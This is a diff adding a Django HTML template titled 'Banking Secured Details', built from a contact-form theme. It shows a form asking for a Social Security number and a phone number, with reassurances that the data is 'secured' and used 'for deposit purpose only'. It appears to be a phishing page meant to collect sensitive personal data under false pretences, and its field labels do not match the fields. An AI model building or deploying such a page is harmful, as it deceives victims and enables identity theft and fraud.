@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+{% load static %}
+<head>
+  <title>Banking Secured Details</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<!--===============================================================================================-->
+  <link rel="icon" type="image/png" href="{% static '/contactform/images/secure-icon-png-20.png' %}"/>
+<!--===============================================================================================-->
+  <link rel="stylesheet" type="text/css" href="{% static 'contactform/vendor/bootstrap/css/bootstrap.min.css' %}">
+<!--===============================================================================================-->
+  <link rel="stylesheet" type="text/css" href="{% static 'contactform/fonts/font-awesome-4.7.0/css/font-awesome.min.css' %}">
+<!--===============================================================================================-->
+  <link rel="stylesheet" type="text/css" href="{% static 'contactform/fonts/Linearicons-Free-v1.0.0/icon-font.min.css' %}">
+<!--===============================================================================================-->
+  <link rel="stylesheet" type="text/css" href="{% static 'contactform/vendor/animate/animate.css' %}">
+<!--===============================================================================================-->
+  <link rel="stylesheet" type="text/css" href="{% static 'contactform/vendor/css-hamburgers/hamburgers.min.css' %}">
+<!--===============================================================================================-->
+  <link rel="stylesheet" type="text/css" href="{% static 'contactform/vendor/animsition/css/animsition.min.css' %}">
+<!--===============================================================================================-->
+  <link rel="stylesheet" type="text/css" href="{% static 'contactform/vendor/select2/select2.min.css' %}">
+<!--===============================================================================================-->
+  <link rel="stylesheet" type="text/css" href="{% static 'contactform/vendor/daterangepicker/daterangepicker.css' %}">
+<!--===============================================================================================-->
+  <link rel="stylesheet" type="text/css" href="{% static 'contactform/css/util.css' %}">
+  <link rel="stylesheet" type="text/css" href="{% static 'contactform/css/main.css' %}">
+      <link rel="icon" href="https://imgur.com/b34soZQ.jpg">
+
+<!--===============================================================================================-->
+</head>
+<body>
+
+
+  <div class="container-contact100">
+    <div class="contact100-map" id="google_map" data-map-x="40.722047" data-map-y="-73.986422" data-pin="images/icons/map-marker.png" data-scrollwhell="0" data-draggable="1"></div>
+
+    <div class="wrap-contact100">
+      <span class="contact100-form-symbol">
+        <img src="{% static '/contactform/images/secure-icon-png-20.jpg' %}" alt="SYMBOL-MAIL">
+      </span>
+
+      <form method="POST">
+        <div> <span class="contact100-form-title">
+          Secured Banking Details </span>
+          
+            {% csrf_token %}
+<span class="contact100-form-title" id="test">
+     Your information is secured with us and will be used for deposit purpose only. </span>
+</div>
+        </span>        <div class="wrap-input100 rs1 validate-input" data-validate = "Name is required">
+{{form.ssn}}   
+        </div>
+
+        <div class="wrap-input100 rs1 validate-input" data-validate = "Email is required: e@a.z">
+{{form.phone}}       <span class="focus-input100"></span>
+        </div>
+        </span>
+
+       
+        
+        <div class="container-contact100-form-btn">
+          <button type="submit" id="mybtn">
+            Send
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+
+
+  <div id="dropDownSelect1"></div>
+
+<!--===============================================================================================-->
+  <script src=" {% static '/contactform/vendor/jquery/jquery-3.2.1.min.js' %}"></script>
+<!--===============================================================================================-->
+  <script src="{% static '/contactform/vendor/animsition/js/animsition.min.js' %}"></script>
+<!--===============================================================================================-->
+  <script src="{% static '/contactform/vendor/bootstrap/js/popper.js' %}"></script>
+  <script src="{% static '/contactform/vendor/bootstrap/js/bootstrap.min.js' %}"></script>
+<!--===============================================================================================-->
+  <script src="{% static '/contactform/vendor/select2/select2.min.js' %}"></script>
+<!--===============================================================================================-->
+  <script src="{% static '/contactform/vendor/daterangepicker/moment.min.js' %}"></script>
+  <script src="{% static '/contactform/vendor/daterangepicker/daterangepicker.js' %}"></script>
+<!--===============================================================================================-->
+  <script src="{% static '/contactform/vendor/countdowntime/countdowntime.js' %}"></script>
+<!--===============================================================================================-->
+
+<!--===============================================================================================-->
+  <script src="{% static 'contactform/js/main.js' %}"></script>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13"></script>
+  
+</body>
+</html>
+<style type="text/css">
+  #test{
+    font-size: 18px;
+  }
+  #mybtn{
+    background-color: black;
+    font-size: 15px;
+    color: white;
+    width: 100%;
+    height: 50px;
+  }
+</style>}}
